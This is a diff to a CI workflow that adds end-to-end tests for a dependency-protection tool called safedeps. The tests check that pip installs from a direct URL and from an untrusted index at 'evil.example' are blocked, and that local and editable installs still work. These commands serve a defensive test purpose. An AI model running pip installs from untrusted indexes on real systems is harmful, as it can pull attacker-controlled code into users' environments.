@@ -84,6 +84,58 @@ jobs:
           fi
           printf "urllib3==2.2.3\n" > constraints.txt
           pip install -c constraints.txt six==1.17.0
+      - name: Activated shell blocks risky pip sources
+        shell: bash
+        run: |
+          set -euo pipefail
+          project="$RUNNER_TEMP/safedeps-pip-sources-e2e"
+          mkdir -p "$project"
+          cd "$project"
+          python -m safedeps.cli setup . --fail-on HIGH --install-scope system --protection-scope project
+          source ./.safedeps/activate.sh
+          hash -r
+          if pip install "demo @ https://example.test/demo-1.0.0.tar.gz"; then
+            echo "Expected direct URL install to be blocked."
+            exit 1
+          fi
+          if pip install --index-url https://evil.example/simple six==1.17.0; then
+            echo "Expected untrusted pip index install to be blocked."
+            exit 1
+          fi
+      - name: Activated shell allows local path and editable installs
+        shell: bash
+        run: |
+          set -euo pipefail
+          project="$RUNNER_TEMP/safedeps-local-path-e2e"
+          package_path="$RUNNER_TEMP/safedeps-local-package-path"
+          package_editable="$RUNNER_TEMP/safedeps-local-package-editable"
+          mkdir -p "$project" "$package_path/src/local_demo_path" "$package_editable/src/local_demo_editable"
+          cat > "$package_path/pyproject.toml" <<'EOF'
+          [build-system]
+          requires = ["setuptools>=68"]
+          build-backend = "setuptools.build_meta"
+
+          [project]
+          name = "safedeps-local-demo-path"
+          version = "0.0.1"
+          EOF
+          cat > "$package_editable/pyproject.toml" <<'EOF'
+          [build-system]
+          requires = ["setuptools>=68"]
+          build-backend = "setuptools.build_meta"
+
+          [project]
+          name = "safedeps-local-demo-editable"
+          version = "0.0.1"
+          EOF
+          printf "__version__ = '0.0.1'\n" > "$package_path/src/local_demo_path/__init__.py"
+          printf "__version__ = '0.0.1'\n" > "$package_editable/src/local_demo_editable/__init__.py"
+          cd "$project"
+          python -m safedeps.cli setup . --fail-on HIGH --install-scope system --protection-scope project
+          source ./.safedeps/activate.sh
+          hash -r
+          pip install --no-build-isolation "$package_path"
+          pip install --no-build-isolation -e "$package_editable"
       - name: Activated shell blocks python -m pip bypass
         shell: bash
         run: |
